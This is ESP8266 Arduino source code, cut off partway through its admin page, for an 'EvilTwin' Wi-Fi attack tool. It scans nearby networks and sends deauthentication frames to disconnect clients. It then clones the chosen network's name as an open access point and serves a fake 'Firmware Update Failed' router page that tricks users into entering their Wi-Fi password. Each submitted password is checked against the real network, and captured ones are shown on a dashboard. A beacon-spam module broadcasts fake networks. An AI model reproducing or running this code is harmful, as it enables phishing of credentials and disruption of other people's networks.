#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

extern "C" {
#include "user_interface.h"
  typedef void (*freedom_outside_cb_t)(uint8 status);
  int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
  void wifi_unregister_send_pkt_freedom_cb(void);
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

// ---------- Forward declarations ----------
String bytesToStr(const uint8_t* b, uint32_t size);
String htmlEscape(String s);

// ===================== LOG SYSTEM =====================
#define LOG_SIZE 30
String logBuffer[LOG_SIZE];
int logCount = 0;
int logHead  = 0;

void addLog(String msg) {
  unsigned long sec = millis() / 1000;
  String entry = "[" + String(sec) + "s] " + msg;
  Serial.println(entry);
  logBuffer[logHead] = entry;
  logHead = (logHead + 1) % LOG_SIZE;
  if (logCount < LOG_SIZE) logCount++;
}
// ======================================================

// ---------- OUI table ----------
struct OUIEntry {
  uint8_t oui[3];
  const char* vendor;
};

const OUIEntry ouiTable[] PROGMEM = {
  { {0xCC, 0x2D, 0x21}, "Tenda" },
  { {0x50, 0xC7, 0xBF}, "TP-Link" },
  { {0x84, 0x16, 0xF9}, "TP-Link" },
  { {0x40, 0xED, 0x00}, "TP-Link" },
  { {0x18, 0xA6, 0xF7}, "Netgear" },
  { {0x00, 0x1A, 0x2B}, "Netgear" },
  { {0x00, 0x24, 0x01}, "D-Link" },
  { {0x00, 0x0C, 0x43}, "Belkin" },
  { {0x00, 0x25, 0x9C}, "Asus" },
  { {0x70, 0x1A, 0x04}, "Huawei" },
  { {0xE0, 0x6A, 0x9E}, "Xiaomi" },
  { {0x24, 0xE4, 0x3A}, "Xiaomi" },
  { {0x00, 0x1F, 0x33}, "Cisco" },
  { {0x00, 0x1A, 0x70}, "Apple" },
  { {0x00, 0x1B, 0x63}, "Apple" },
  { {0x00, 0x1E, 0x52}, "Apple" },
  { {0x00, 0x1C, 0xB3}, "Apple" },
  { {0xAC, 0x29, 0x3A}, "Apple" },
  { {0x00, 0x25, 0xBC}, "Microsoft" },
  { {0x00, 0x1D, 0x60}, "Samsung" },
  { {0x00, 0x26, 0x5B}, "Samsung" },
  { {0x00, 0x27, 0x14}, "Samsung" },
  { {0x00, 0x11, 0x32}, "Sony" },
  { {0x00, 0x14, 0xA4}, "Dell" },
  { {0x00, 0x21, 0x5E}, "Intel" },
  { {0x00, 0x23, 0x32}, "Intel" },
  { {0x00, 0x1F, 0xC1}, "Realtek" },
};

const int ouiCount = sizeof(ouiTable) / sizeof(ouiTable[0]);

String getVendor(const uint8_t* bssid) {
  for (int i = 0; i < ouiCount; i++) {
    if (bssid[0] == pgm_read_byte(&ouiTable[i].oui[0]) &&
        bssid[1] == pgm_read_byte(&ouiTable[i].oui[1]) &&
        bssid[2] == pgm_read_byte(&ouiTable[i].oui[2])) {
      return String((const char*)pgm_read_ptr(&ouiTable[i].vendor));
    }
  }
  return "Unknown";
}

// ---------- Structures ----------
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  String vendor;
} _Network;

// ---------- Mask (fake AP) management ----------
#define MAX_MASKS 20
struct Mask {
  String ssid;
  uint8_t bssid[6];
};
Mask masks[MAX_MASKS];
int maskCount = 0;
bool beacon_spamming_active = false;

void generateBSSID(int index, uint8_t* bssid) {
  bssid[0] = 0x02; bssid[1] = 0x00; bssid[2] = 0x00;
  bssid[3] = 0x00; bssid[4] = 0x00;
  bssid[5] = (uint8_t)(index + 1);
}

void addMask(String ssid) {
  if (maskCount < MAX_MASKS) {
    masks[maskCount].ssid = ssid;
    generateBSSID(maskCount, masks[maskCount].bssid);
    maskCount++;
  }
}

void deleteMask(int index) {
  if (index >= 0 && index < maskCount) {
    for (int i = index; i < maskCount - 1; i++) masks[i] = masks[i + 1];
    maskCount--;
  }
}

void clearMasks() { maskCount = 0; beacon_spamming_active = false; }

String randomSSID() {
  const char* words[] = {"Home","Office","Guest","WiFi","Network","Router","AP","5G","2G","Hotspot"};
  return String(words[random(0, 10)]) + "-" + String(random(1000, 9999));
}

// ---------- Beacon spamming ----------
const uint8_t channels[] = {1, 6, 11};
const bool wpa2 = false;
const bool appendSpaces = true;

uint8_t beaconPacket[109] = {
  0x80,0x00,0x00,0x00,
  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
  0x01,0x02,0x03,0x04,0x05,0x06,
  0x01,0x02,0x03,0x04,0x05,0x06,
  0x00,0x00,
  0x83,0x51,0xf7,0x8f,0x0f,0x00,0x00,0x00,
  0xe8,0x03,
  0x31,0x00,
  0x00,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
  0x01,0x08,
  0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c,
  0x03,0x01,0x01,
  0x30,0x18,
  0x01,0x00,
  0x00,0x0f,0xac,0x02,
  0x02,0x00,
  0x00,0x0f,0xac,0x04,0x00,0x0f,0xac,0x04,
  0x01,0x00,
  0x00,0x0f,0xac,0x02,
  0x00,0x00
};

char emptySSID[32];
uint8_t channelIndex = 0;
uint8_t wifi_channel = 1;
uint8_t macAddr[6];

uint32_t packetSize = sizeof(beaconPacket);
uint32_t packetCounter = 0;
uint32_t attackTime = 0;
uint32_t packetRateTime = 0;

void nextChannel() {
  if (sizeof(channels) > 1) {
    uint8_t ch = channels[channelIndex];
    channelIndex++;
    if (channelIndex >= sizeof(channels)) channelIndex = 0;
    if (ch != wifi_channel && ch >= 1 && ch <= 14) {
      wifi_channel = ch;
      wifi_set_channel(wifi_channel);
    }
  }
}

void randomMac() { for (int i = 0; i < 6; i++) macAddr[i] = random(256); }

// ---------- Globals ----------
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) { _Network n; _networks[i] = n; }
}

String _correct = "";
String _tryPassword = "";

// State flags
bool  promisc_enabled            = false;
unsigned long connect_started_at = 0;
bool  pending_ap_swap            = false;
unsigned long pending_ap_swap_time = 0;

// Deauth state (NEW: split into intent + active)
bool  deauth_intent      = false;   // user's intent from admin UI
bool  deauthing_active   = false;   // actual sending state
bool  prev_deauth        = false;   // saved intent before verification
int   deauth_interval_ms = 1000;    // burst interval (NEW: configurable)
const int DEAUTH_MIN_MS  = 50;      // "immediate" lower bound

#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

// ---------- File-scope PROGMEM pages ----------
const char successPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Update Successful</title>
<style>
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f0f4f8;margin:0;padding:0;
display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:white;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,.12);
padding:40px 30px;max-width:480px;width:90%;text-align:center}
.icon{font-size:72px;color:#2ecc71;margin-bottom:16px}
h1{color:#2c3e50;font-weight:600;margin:0 0 8px 0}
.sub{color:#7f8c8d;font-size:16px;margin-bottom:24px}
.detail{background:#f8f9fa;border-radius:8px;padding:16px;margin:16px 0;font-size:14px;
color:#2c3e50;text-align:left}
.detail span{font-weight:600;color:#2980b9}
.footer{margin-top:24px;font-size:12px;color:#bdc3c7}
</style></head>
<body><div class="container">
<div class="icon">&#9989;</div>
<h1>Update Successful</h1>
<p class="sub">Your router firmware has been updated.</p>
<div class="detail">
<strong>Network:</strong> <span>{ssid}</span><br>
<strong>Status:</strong> <span style="color:#2ecc71;">Connected</span>
</div>
<p style="color:#7f8c8d;font-size:14px;">Please reconnect your WiFi to the updated network.</p>
<div class="footer">Router firmware update complete &bull; v2.1.0</div>
</div></body></html>
)rawliteral";

const char progressPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verifying...</title>
<style>
body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;text-align:center;
padding:20px;background:#f0f4f8;color:#2c3e50}
h2{font-size:6vw;margin-top:30px;font-weight:300}
progress{width:80%;max-width:400px;height:8px;border-radius:4px}
progress::-webkit-progress-bar{background:#ddd;border-radius:4px}
progress::-webkit-progress-value{background:#3498db;border-radius:4px}
#status{margin-top:16px;font-size:14px;color:#7f8c8d}
</style>
<script>
let startTime = Date.now();
const TIMEOUT = 30000;
function updateProgress(){
  let elapsed = Date.now() - startTime;
  let percent = Math.min(95, 10 + (elapsed / TIMEOUT) * 85);
  document.getElementById('progressBar').value = percent;
  document.getElementById('status').textContent =
    'Verifying integrity, please wait... ' + Math.round(percent) + '%';
  return percent;
}
function checkStatus(){
  fetch('/check', {cache:'no-store'})
    .then(r => r.text())
    .then(data => {
      if (data === 'connected' || data === 'failed') {
        window.location.href = '/result';
        return;
      }
      let p = updateProgress();
      if (p < 95) {
        setTimeout(checkStatus, 500);
      } else {
        window.location.href = '/result';
      }
    })
    .catch(() => setTimeout(checkStatus, 700));
}
window.onload = function(){
  document.getElementById('progressBar').max = 100;
  setTimeout(checkStatus, 1500);
};
</script></head>
<body>
<h2>Verifying integrity, please wait...</h2>
<progress id="progressBar" value="10" max="100"></progress>
<p id="status">Verifying integrity, please wait... 10%</p>
</body></html>
)rawliteral";

// ---------- Helpers ----------
String htmlEscape(String s) {
  s.replace("&", "&amp;");
  s.replace("<", "&lt;");
  s.replace(">", "&gt;");
  s.replace("\"", "&quot;");
  s.replace("'", "&#39;");
  return s;
}

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article{background:#f2f2f2;padding:1.3em}"
               "body{color:#333;font-family:Century Gothic,sans-serif;font-size:18px;line-height:24px;margin:0;padding:0}"
               "div{padding:.5em}h1{margin:.5em 0 0 0;padding:.5em;font-size:7vw}"
               "input{width:100%;padding:9px 10px;margin:8px 0;box-sizing:border-box;border:1px solid #555;border-radius:10px}"
               "label{color:#333;display:block;font-style:italic;font-weight:bold}"
               "nav{background:#0066ff;color:#fff;display:block;font-size:1.3em;padding:1em}"
               "nav b{display:block;font-size:1.5em;margin-bottom:.5em}";
  return "<!DOCTYPE html><html><head><title><center>" + a + " :: " + t + "</center></title>"
         "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
         "<style>" + CSS + "</style><meta charset=\"UTF-8\"></head>"
         "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
}

String footer() { return "</div><div class=q><a>&#169; All rights reserved.</a></div>"; }

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>"
         "<input type=password id='password' name='password' minlength='8'></input>"
         "<input type=submit value=Update></form>" + footer();
}

String getLogsHTML() {
  if (logCount == 0) return "<div class='log-line log-empty'>No events yet.</div>";
  String out = "";
  int start = (logCount < LOG_SIZE) ? 0 : logHead;
  for (int i = 0; i < logCount; i++) {
    int idx = (start + i) % LOG_SIZE;
    out += "<div class='log-line'>" + htmlEscape(logBuffer[idx]) + "</div>";
  }
  return out;
}

String deauthIntervalLabel(int v) {
  if (v <= DEAUTH_MIN_MS + 5) return "Immediate";
  if (v < 1000) return String(v) + " ms";
  return String(v / 1000.0, 1) + " s";
}

// ---------- Fallback AP helper ----------
void startFallbackAP() {
  dnsServer.stop();
  int n = WiFi.softAPdisconnect(true);
  Serial.print("softAPdisconnect -> "); Serial.println(n);
  delay(50);
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP("Rahmttollah", "66778899", 1, false);
  dnsServer.start(53, "*", IPAddress(192,168,4,1));
  addLog("Fallback AP started (visible).");
}

// ---------- setup ----------
void setup() {
  Serial.begin(115200);
  randomSeed(os_random());

  for (int i = 0; i < 32; i++) emptySSID[i] = ' ';

  if (!wpa2) { beaconPacket[34] = 0x21; packetSize -= 26; }

  randomMac();

  WiFi.mode(WIFI_OFF);
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(channels[0]);

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  promisc_enabled = true;
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP("Rahmttollah", "66778899", 1, false);
  dnsServer.start(53, "*", IPAddress(192,168,4,1));

  webServer.on("/",           handleIndex);
  webServer.on("/result",     handleResult);
  webServer.on("/admin",      handleAdmin);
  webServer.on("/restart",    handleRestart);
  webServer.on("/check",      handleCheck);
  webServer.on("/clearlogs",  handleClearLogs);
  webServer.on("/masks",      handleMasks);
  webServer.on("/masks/add",  handleMasksAdd);
  webServer.on("/masks/random", handleMasksRandom);
  webServer.on("/masks/delete", handleMasksDelete);
  webServer.on("/masks/clear",  handleMasksClear);
  webServer.on("/masks/start",  handleMasksStart);
  webServer.on("/masks/stop",   handleMasksStop);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  addLog("Boot complete. Fallback AP visible.");
}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) network.bssid[j] = WiFi.BSSID(i)[j];
      network.ch = WiFi.channel(i);
      network.vendor = getVendor(network.bssid);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;

// ---------- EvilTwin handlers ----------
void handleResult() {
  addLog("handleResult called.");
  wl_status_t s = WiFi.status();
  bool timed_out = (connect_started_at != 0 && (millis() - connect_started_at) >= 30000);
  addLog("WiFi.status()=" + String((int)s) + "  timed_out=" + String(timed_out ? "yes" : "no"));

  // ---- SUCCESS ----
  if (s == WL_CONNECTED) {
    _correct = "Network: " + _selectedNetwork.ssid + "   Password: " + _tryPassword;
    addLog("SUCCESS! Password captured: " + _tryPassword);

    hotspot_active   = false;
    deauth_intent    = false;
    deauthing_active = false;
    prev_deauth      = false;

    String page = FPSTR(successPage);
    page.replace("{ssid}", htmlEscape(_selectedNetwork.ssid));
    webServer.send(200, "text/html; charset=UTF-8", page);
    webServer.client().flush();
    delay(50);

    pending_ap_swap      = true;
    pending_ap_swap_time = millis() + 1500;
    addLog("Success page sent. AP swap in 1.5s.");
    return;
  }

  // ---- FAIL ----
  if (s == WL_NO_SSID_AVAIL || s == WL_CONNECT_FAILED || timed_out) {
    addLog("Wrong password (or timeout) for " + _selectedNetwork.ssid);

    // Restore deauth to the user's INTENT (not the paused state)
    deauthing_active = prev_deauth;
    if (deauthing_active && !promisc_enabled) {
      wifi_promiscuous_enable(1);
      promisc_enabled = true;
    }
    addLog(String("Deauth restored to ") + (deauthing_active ? "ON" : "OFF") +
           " (intent=" + String(deauth_intent ? "ON" : "OFF") + ")");

    webServer.send(200, "text/html; charset=UTF-8",
      "<html><head><script>setTimeout(function(){window.location.href='/';},4000);</script>"
      "<meta name='viewport' content='initial-scale=1.0,width=device-width'>"
      "<body><center><h2 style='font-family:sans-serif'>"
      "<span style='color:red;font-size:60px;'>&#8855;</span><br>"
      "Wrong Password</h2><p>Please, try again.</p></center></body></html>");
    return;
  }

  // ---- STILL TRYING ----
  addLog("Still verifying... (will retry)");
  webServer.send(200, "text/html; charset=UTF-8",
    "<html><head><meta charset='UTF-8'></head>"
    "<body style='font-family:sans-serif;text-align:center'>"
    "<h2>Still verifying...</h2>"
    "<p>Please wait, do not close this page.</p>"
    "<script>setTimeout(function(){window.location.href='/result';},2000);</script>"
    "</body></html>");
}

void handleCheck() {
  wl_status_t s = WiFi.status();
  if (s == WL_CONNECTED) { webServer.send(200, "text/plain", "connected"); return; }
  if (s == WL_NO_SSID_AVAIL || s == WL_CONNECT_FAILED) {
    webServer.send(200, "text/plain", "failed"); return;
  }
  if (connect_started_at != 0 && (millis() - connect_started_at) > 30000) {
    webServer.send(200, "text/plain", "failed"); return;
  }
  webServer.send(200, "text/plain", "connecting");
}

void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
        addLog("Selected network: " + _selectedNetwork.ssid);
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start" && _selectedNetwork.ssid != "") {
      deauth_intent    = true;
      deauthing_active = true;
      if (!promisc_enabled) { wifi_promiscuous_enable(1); promisc_enabled = true; }
      addLog("Deauth STARTED (intent=ON).");
    } else if (webServer.arg("deauth") == "stop") {
      deauth_intent    = false;
      deauthing_active = false;
      if (promisc_enabled) { wifi_promiscuous_enable(0); promisc_enabled = false; }
      addLog("Deauth STOPPED (intent=OFF).");
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start" && _selectedNetwork.ssid != "") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(n);
      WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192,168,4,1));
      addLog("EvilTwin STARTED as: " + _selectedNetwork.ssid);
      if (webServer.hasArg("deauth") && webServer.arg("deauth") == "start") {
        deauth_intent    = true;
        deauthing_active = true;
        if (!promisc_enabled) { wifi_promiscuous_enable(1); promisc_enabled = true; }
        addLog("Deauth also STARTED.");
      }
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      startFallbackAP();
      addLog("EvilTwin STOPPED. Fallback AP restored.");
    }
    return;
  }

  if (hotspot_active == false) {
    webServer.send(200, "text/html; charset=UTF-8",
      "<html><head><meta charset='UTF-8'><meta http-equiv='refresh' content='0;url=/admin'>"
      "</head><body>Redirecting to admin...</body></html>");
    return;
  }

  if (webServer.hasArg("password")) {
    _tryPassword = webServer.arg("password");
    addLog("Password submitted: " + _tryPassword);
    addLog("Target: " + _selectedNetwork.ssid + "  " +
           bytesToStr(_selectedNetwork.bssid, 6) + "  ch=" + String(_selectedNetwork.ch));

    // Save INTENT (not paused state) so we can restore it correctly later
    prev_deauth      = deauth_intent;
    deauthing_active = false;
    if (promisc_enabled) {
      wifi_promiscuous_enable(0);
      promisc_enabled = false;
    }
    addLog("Deauth paused for verification (intent saved=" +
           String(prev_deauth ? "ON" : "OFF") + ").");

    delay(150);
    WiFi.disconnect(false);
    delay(200);

    if (wifi_get_opmode() != STATIONAP_MODE) {
      WiFi.mode(WIFI_AP_STA);
      delay(100);
    }

    connect_started_at = millis();
    WiFi.begin(_selectedNetwork.ssid.c_str(),
               _tryPassword.c_str(),
               _selectedNetwork.ch,
               _selectedNetwork.bssid);
    addLog("WiFi.begin called (AP+STA mode).");

    webServer.send(200, "text/html; charset=UTF-8", FPSTR(progressPage));
    addLog("Progress page sent. Polling starts in ~1.5s.");
  } else {
    webServer.send(200, "text/html; charset=UTF-8", index());
  }
}

// ---------- Admin HTML ----------
const char adminHTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WiFi Admin Dashboard</title>
<style>
:root{
  --bg:#0a0f18;--panel:#111827;--panel2:#0f1724;--border:#253044;
  --text:#f5f7fb;--muted:#8f9bb0;--accent:#5b8cff;--accent2:#7c5cff;--good:#35d39a;
}
*{box-sizing:border-box}
body{margin:0;background:radial-gradient(circle at 15% 0%,rgba(91,140,255,.13),transparent 30%),
radial-gradient(circle at 90% 10%,rgba(124,92,255,.10),transparent 28%),var(--bg);
color:var(--text);font-family:Inter,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
.shell{max-width:1100px;margin:auto;padding:28px 18px 40px}
.topbar{display:flex;align-items:center;justify-content:space-between;gap:18px;
padding:18px 20px;margin-bottom:22px;background:rgba(17,24,39,.82);border:1px solid var(--border);
border-radius:18px;backdrop-filter:blur(14px)}
.brand{display:flex;align-items:center;gap:13px}
.logo{width:44px;height:44px;border-radius:13px;display:grid;place-items:center;
background:linear-gradient(135deg,var(--accent),var(--accent2));font-weight:800;font-size:18px}
.title{font-size:18px;font-weight:750}
.subtitle{font-size:12px;color:var(--muted);margin-top:3px}
.status{display:flex;align-items:center;gap:8px;color:var(--good);font-size:13px;font-weight:650}
.dot{width:8px;height:8px;border-radius:50%;background:var(--good);box-shadow:0 0 12px rgba(53,211,154,.65)}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-bottom:22px}
.card{background:rgba(17,24,39,.82);border:1px solid var(--border);border-radius:17px;padding:18px}
.label{font-size:12px;color:var(--muted);margin-bottom:9px}
.value{font-size:25px;font-weight:760;letter-spacing:-.4px}
.small{font-size:12px;color:var(--muted);margin-top:5px}
.section-head{display:flex;justify-content:space-between;align-items:center;gap:12px;margin:4px 2px 12px}
.section-title{font-size:15px;font-weight:720}
.actions{display:flex;gap:9px;flex-wrap:wrap}
button{border:1px solid var(--border);background:#151e2d;color:var(--text);padding:9px 13px;
border-radius:10px;cursor:pointer;font-weight:650}
button:hover{border-color:#3b4a65;background:#192438}
button:disabled{opacity:0.4;cursor:default}
.primary{background:var(--accent);border-color:var(--accent)}
.primary:hover{background:#4e7ff0}
.danger{background:#e74c3c;border-color:#e74c3c}
.danger:hover{background:#c0392b}
.settings-bar{display:flex;align-items:center;gap:10px;flex-wrap:wrap;
background:rgba(17,24,39,.82);border:1px solid var(--border);border-radius:14px;
padding:12px 16px;margin-bottom:18px}
.settings-bar .lbl{font-size:13px;color:var(--muted);font-weight:650}
.settings-bar select,.settings-bar input{background:#0f1724;border:1px solid var(--border);
color:var(--text);padding:8px 12px;border-radius:8px;font-size:13px;font-family:inherit}
.settings-bar select:focus,.settings-bar input:focus{outline:1px solid var(--accent)}
.settings-bar .cur{font-size:12px;color:var(--good);font-weight:650}
.table-wrap{overflow-x:auto;border:1px solid var(--border);border-radius:17px;background:rgba(17,24,39,.82)}
table{width:100%;border-collapse:collapse;min-width:650px}
th,td{text-align:left;padding:15px 16px;border-bottom:1px solid var(--border)}
th{font-size:11px;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);font-weight:700}
td{font-size:13px}tr:last-child td{border-bottom:0}
tr{cursor:pointer;transition:background 0.15s}
tr:hover td{background:rgba(255,255,255,.05)}
tr.selected{background:rgba(91,140,255,.12);border-left:3px solid var(--accent)}
.ssid{font-weight:700}
.badge{display:inline-flex;align-items:center;gap:6px;padding:5px 9px;border-radius:999px;
background:rgba(91,140,255,.11);color:#a9c0ff;font-size:11px;font-weight:700}
.captured-card{margin-top:22px;background:rgba(17,24,39,.82);border:1px solid var(--border);
border-radius:17px;padding:18px;display:flex;align-items:center;justify-content:space-between;
flex-wrap:wrap;gap:10px}
.captured-left{display:flex;flex-direction:column;gap:4px}
.captured-title{font-size:14px;font-weight:700;color:var(--good)}
.captured-value{font-size:18px;word-break:break-all}
.copy-btn{background:transparent;border:1px solid var(--border);padding:8px 14px;border-radius:8px;
cursor:pointer;color:var(--text);font-size:14px;display:flex;align-items:center;gap:6px;transition:0.2s}
.copy-btn:hover{background:rgba(91,140,255,.15);border-color:var(--accent)}
.copy-btn:active{transform:scale(0.95)}
.copy-btn svg{width:18px;height:18px;fill:none;stroke:currentColor;stroke-width:2;
stroke-linecap:round;stroke-linejoin:round}
.copy-btn.copied{color:var(--good);border-color:var(--good)}
.log-card{margin-top:22px;background:rgba(17,24,39,.82);border:1px solid var(--border);
border-radius:17px;padding:18px}
.log-header{display:flex;justify-content:space-between;align-items:center;gap:10px;margin-bottom:12px}
.log-title{font-size:14px;font-weight:700;color:var(--accent)}
.log-box{background:#060a10;border:1px solid var(--border);border-radius:10px;padding:12px 14px;
max-height:320px;overflow-y:auto;font-family:ui-monospace,Menlo,Consolas,monospace;
font-size:12px;line-height:1.6;color:#b8c5d6}
.log-line{padding:2px 0;border-bottom:1px dashed rgba(255,255,255,.04);word-break:break-all}
.log-line:last-child{border-bottom:0}
.log-empty{color:var(--muted);font-style:italic}
.footer{margin-top:16px;text-align:center;color:var(--muted);font-size:11px}
.watermark{text-align:center;margin-top:22px;font-size:13px;color:var(--muted);opacity:0.8;letter-spacing:0.5px}
.watermark span{color:var(--accent);font-weight:700}
@media(max-width:700px){
 .shell{padding:16px 12px 28px}
 .topbar{align-items:flex-start}
 .stats{grid-template-columns:1fr}
 .actions{width:100%}
 .actions button{flex:1}
 .settings-bar{flex-direction:column;align-items:stretch}
}
</style>
<script>
function selectNetwork(bssid){window.location.href="/admin?ap="+bssid;}
function copyPassword(){
 const t=document.getElementById('passwordText').innerText;
 if(!t||t==='None yet'){alert('No password to copy!');return;}
 const m=t.match(/Password:\s*(.+)$/);
 const pwd=m?m[1]:t;
 navigator.clipboard.writeText(pwd).then(()=>{
   const b=document.getElementById('copyBtn');
   b.classList.add('copied');b.innerHTML='&#9989; Copied!';
   setTimeout(()=>{b.classList.remove('copied');
     b.innerHTML=`<svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg> Copy`;},2000);
 }).catch(e=>{alert('Could not copy password.');console.error(e);});
}
function restartESP(){
 if(confirm('Restart the ESP8266? All temporary data will be lost.')){
   fetch('/restart',{method:'POST'}).then(()=>alert('Restarting...'));
 }
}
function clearLogs(){
 if(confirm('Clear all logs?')){ location.href='/clearlogs'; }
}
function onDeauthSelChange(){
 var sel=document.getElementById('deauthSel');
 var cust=document.getElementById('deauthCustom');
 cust.style.display=(sel.value==='custom')?'inline-block':'none';
}
function applyDeauthInt(){
 var sel=document.getElementById('deauthSel');
 var val;
 if(sel.value==='custom'){
   val=parseInt(document.getElementById('deauthCustom').value,10);
   if(isNaN(val)||val<50||val>60000){alert('Enter a value between 50 and 60000 ms');return;}
 } else {
   val=parseInt(sel.value,10);
 }
 location.href='/admin?deauthint='+val;
}
window.addEventListener('load',function(){
 var b=document.getElementById('logBox'); if(b) b.scrollTop=b.scrollHeight;
 var cur={deauth_int};
 var sel=document.getElementById('deauthSel');
 var found=false;
 for(var i=0;i<sel.options.length;i++){
   if(parseInt(sel.options[i].value,10)===cur){sel.selectedIndex=i;found=true;break;}
 }
 if(!found){
   sel.value='custom';
   document.getElementById('deauthCustom').value=cur;
   document.getElementById('deauthCustom').style.display='inline-block';
 }
});
</script>
</head>
<body><div class="shell">
<header class="topbar">
 <div class="brand"><div class="logo">W</div>
  <div><div class="title">WiFi Admin Dashboard</div>
       <div class="subtitle">Network scanner interface</div></div></div>
 <div class="status"><span class="dot"></span> Scanner Ready</div>
</header>

<section class="stats">
 <div class="card"><div class="label">Networks Found</div>
  <div class="value" id="networkCount">{network_count}</div>
  <div class="small">Latest scan results</div></div>
 <div class="card"><div class="label">Selected Network</div>
  <div class="value" id="selectedName">{selected_name}</div>
  <div class="small">Current selection</div></div>
 <div class="card"><div class="label">Scanner Status</div>
  <div class="value" style="color:var(--good)">Online</div>
  <div class="small">ESP8266 interface active</div></div>
</section>

<div class="settings-bar">
 <span class="lbl">Deauth burst interval:</span>
 <select id="deauthSel" onchange="onDeauthSelChange()">
   <option value="50">Immediate (~50 ms)</option>
   <option value="500">0.5 s</option>
   <option value="1000">1 s</option>
   <option value="2000">2 s</option>
   <option value="5000">5 s</option>
   <option value="custom">Custom (ms)</option>
 </select>
 <input type="number" id="deauthCustom" min="50" max="60000" placeholder="ms" style="display:none;width:110px">
 <button onclick="applyDeauthInt()" class="primary">Apply</button>
 <span class="cur">Now: {deauth_int_label} ({deauth_int} ms)</span>
</div>

<div class="section-head">
 <div class="section-title">Nearby Networks</div>
 <div class="actions">
  <form style="display:inline-block" method="post" action="/admin?deauth={deauth_action}">
   <button type="submit" {deauth_disabled}>{deauth_button}</button></form>
  <button onclick='if("{hotspot_action}"=="start"){if(confirm("Deauth-o start korbe?")){location="/admin?hotspot=start&deauth=start";}else{location="/admin?hotspot=start";}}else{location="/admin?hotspot=stop";}' {hotspot_disabled}>{hotspot_button}</button>
  <button onclick="location.href='/masks'" class="primary">Manage Masks</button>
  <button id="refresh" onclick="location.reload()">Refresh UI</button>
  <button onclick="restartESP()" class="danger">Restart ESP</button>
 </div>
</div>

<div class="table-wrap"><table>
 <thead><tr><th>SSID</th><th>BSSID</th><th>Vendor</th><th>Channel</th></tr></thead>
 <tbody>{network_rows}</tbody>
</table></div>

<div class="captured-card">
 <div class="captured-left">
  <div class="captured-title">&#128273; Captured Password</div>
  <div class="captured-value" id="passwordText">{captured_password}</div>
 </div>
 <button class="copy-btn" id="copyBtn" onclick="copyPassword()">
  <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
  <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
  Copy</button>
</div>

<div class="log-card">
 <div class="log-header">
  <div class="log-title">&#128203; System Log</div>
  <button class="danger" onclick="clearLogs()">Clear Logs</button>
 </div>
